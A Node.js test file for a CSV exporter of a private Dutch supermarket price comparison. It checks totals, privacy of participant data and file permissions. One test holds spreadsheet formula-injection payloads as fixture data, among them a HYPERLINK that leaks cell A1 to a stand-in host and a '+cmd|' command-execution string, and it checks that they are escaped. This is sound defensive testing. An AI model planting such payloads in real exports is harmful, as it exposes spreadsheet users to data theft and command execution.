import assert from 'node:assert/strict'
import test from 'node:test'
import { spawnSync } from 'node:child_process'
import { mkdtemp, readFile, writeFile, rm, stat } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { buildFictionalPricedSheet, buildFictionalRehearsalSheet } from '../scripts/m3-rehearse-field-run.mjs'
import { buildPrivateM3ProductComparison } from '../scripts/m3-private-product-comparison.mjs'
import { renderPrivateM3ComparisonCsv } from '../scripts/m3-private-comparison-csv.mjs'

const cli = fileURLToPath(new URL('../scripts/m3-private-comparison-csv.mjs', import.meta.url))
const secret = 'FICTIONAL_PRIVATE_PARTICIPANT_NEVER_EXPORT_7359'

function report() {
  return buildPrivateM3ProductComparison(buildFictionalPricedSheet(90))
}

test('M3 private CSV uses UTF-8 Dutch headers and exactly 11 complete product rows', () => {
  const original = report()
  const before = JSON.stringify(original)
  const csv = renderPrivateM3ComparisonCsv(original)
  assert.ok(csv.startsWith('\ufeff"PRIVE / NIET GEVERIFIEERD"'))
  const lines = csv.trimEnd().split('\r\n')
  assert.equal(lines.length, 14, 'privacy warning, header, eleven rows and one full-basket footer')
  assert.match(lines[1], /"PLUS prijs per pak \(EUR\)"/)
  assert.match(lines[1], /"Deka - PLUS \(EUR\)"/)
  assert.equal(lines.filter(line => line.includes('"Voorlopig vergelijkbaar"')).length, 11)
  assert.match(lines[2], /"1,00"/)
  assert.match(lines[2], /"0,90"/)
  assert.match(lines[2], /"-0,10"/)
  assert.match(lines[13], /"VOORLOPIGE VOLLEDIGE MAND"/)
  assert.match(lines[13], /"11,00";"9,90";"-1,10"/)
  assert.equal(JSON.stringify(original), before)
  assert.doesNotMatch(csv, /participantKey|studyId|sourceUrl|evidenceId|provenanceNote/)
  assert.match(csv, /Geen actuele prijsfeed en geen publieke besparingsclaim/)
})

test('M3 private CSV incomplete measured pair never invents full basket winner', () => {
  const sheet = buildFictionalPricedSheet(90)
  sheet.candidate.lines[0].observedProduct.available = false
  const csv = renderPrivateM3ComparisonCsv(buildPrivateM3ProductComparison(sheet))
  assert.match(csv, /"Niet gemeten \/ niet beschikbaar"/)
  assert.match(csv, /"Onbekend \/ niet volledig"/)
  assert.match(csv, /"VOLLEDIGE MAND ONBEKEND"/)
  assert.doesNotMatch(csv, /"VOORLOPIGE VOLLEDIGE MAND"/)
  assert.equal(csv.split('\r\n').filter(line => line.includes('"Voorlopig vergelijkbaar"')).length, 10)
})

test('M3 explicitly unavailable fictional 11+11 has only unknown comparisons', () => {
  const csv = renderPrivateM3ComparisonCsv(
    buildPrivateM3ProductComparison(buildFictionalRehearsalSheet()),
  )
  assert.equal(csv.split('\r\n').filter(line => line.includes('"Onbekend / niet volledig"')).length, 11)
  assert.match(csv, /"VOLLEDIGE MAND ONBEKEND"/)
  assert.doesNotMatch(csv, /"VOORLOPIGE VOLLEDIGE MAND"/)
})

test('M3 CSV escapes formula injection, separators, quotes and newlines in product labels', () => {
  const fixture = report()
  fixture.lines[0].plus.productName = ' =HYPERLINK("https://fake.example/?" & A1);\r\n@SUM(1)'
  fixture.lines[1].dekamarkt.productName = '+cmd|\' /C echo test'
  fixture.lines[2].ingredientLabel = '-1+1'
  fixture.lines[3].plus.productName = '@evil, data'
  const csv = renderPrivateM3ComparisonCsv(fixture)
  assert.match(csv, /"' =HYPERLINK\(""https:\/\/fake\.example/)
  assert.match(csv, /"'\\+cmd/)
  assert.match(csv, /"'-1\+1"/)
  assert.match(csv, /"'@evil/)
  assert.doesNotMatch(csv, /\r\n@SUM/)
  assert.equal(csv.trimEnd().split('\r\n').length, 14)
  assert.equal(csv.split('\r\n').filter(line => line.includes('"Voorlopig vergelijkbaar"')).length, 11)
})

test('M3 CSV rejects forged private approval, cents, basket delta and incomplete winner', () => {
  const baseline = report()
  for (const mutate of [
    r => { r.publicSavingsClaimEligible = true },
    r => { r.verifiedRetailerObservations = true },
    r => { r.lines[0].plus.lineTotalCents += 1 },
    r => { r.lines[0].provisionalLineDeltaCents = 100 },
    r => { r.fullBasket.deltaCents += 1 },
    r => { r.fullBasket.provisionalSavingsCents += 1 },
  ]) {
    const forged = structuredClone(baseline)
    mutate(forged)
    assert.throws(() => renderPrivateM3ComparisonCsv(forged))
  }
  const sheet = buildFictionalPricedSheet(90)
  sheet.candidate.lines[0].observedProduct.available = false
  const incomplete = buildPrivateM3ProductComparison(sheet)
  incomplete.fullBasket.outcome = 'better'
  assert.throws(() => renderPrivateM3ComparisonCsv(incomplete))
})

test('M3 CSV exact better/equal/worse signed financial rows stay provisional', () => {
  for (const [price, delta] of [[90, '-1,10'], [100, '0,00'], [110, '1,10']]) {
    const csv = renderPrivateM3ComparisonCsv(
      buildPrivateM3ProductComparison(buildFictionalPricedSheet(price)),
    )
    assert.match(csv, new RegExp('"VOORLOPIGE VOLLEDIGE MAND".*"' + delta.replace('.', '\\.') + '"'))
    assert.match(csv, /Geen actuele prijsfeed en geen publieke besparingsclaim/)
  }
})

test('M3 CSV CLI from canonical private 22-line sheet writes mode 0600 and preserves original', async () => {
  const root = await mkdtemp(join(tmpdir(), 'supa-m3-csv-'))
  try {
    const input = join(root, secret + '-sheet.json')
    const output = join(root, 'private-products.csv')
    const sheet = buildFictionalPricedSheet(90)
    sheet.study.population = secret
    const source = JSON.stringify(sheet)
    await writeFile(input, source, { mode: 0o600 })
    const run = spawnSync(process.execPath,
      ['--experimental-strip-types', cli, '--sheet', input, '--output', output],
      { encoding: 'utf8' })
    assert.equal(run.status, 0, run.stderr)
    assert.equal(run.stdout, '')
    assert.equal(run.stderr, '')
    assert.equal(await readFile(input, 'utf8'), source)
    assert.equal((await stat(output)).mode & 0o777, 0o600)
    const csv = await readFile(output, 'utf8')
    assert.match(csv, /"11,00";"9,90";"-1,10"/)
    assert.doesNotMatch(csv, new RegExp(secret))
    const overwrite = spawnSync(process.execPath,
      ['--experimental-strip-types', cli, '--sheet', input, '--output', input],
      { encoding: 'utf8' })
    assert.notEqual(overwrite.status, 0)
    assert.equal(overwrite.stdout, '')
    assert.doesNotMatch(overwrite.stderr, new RegExp(secret))
    assert.equal(await readFile(input, 'utf8'), source)
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test('M3 CSV CLI from a prebuilt local comparison file matches one-command sheet output', async () => {
  const root = await mkdtemp(join(tmpdir(), 'supa-m3-csv-reuse-'))
  try {
    const reportPath = join(root, 'private-comparison.json')
    const output = join(root, 'private-comparison.csv')
    const original = JSON.stringify(report())
    await writeFile(reportPath, original, { mode: 0o600 })
    const result = spawnSync(process.execPath,
      ['--experimental-strip-types', cli, reportPath, '--output', output],
      { encoding: 'utf8' })
    assert.equal(result.status, 0, result.stderr)
    assert.equal(result.stdout, '')
    assert.equal(result.stderr, '')
    assert.equal(await readFile(reportPath, 'utf8'), original)
    assert.equal(await readFile(output, 'utf8'), renderPrivateM3ComparisonCsv(JSON.parse(original)))
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})
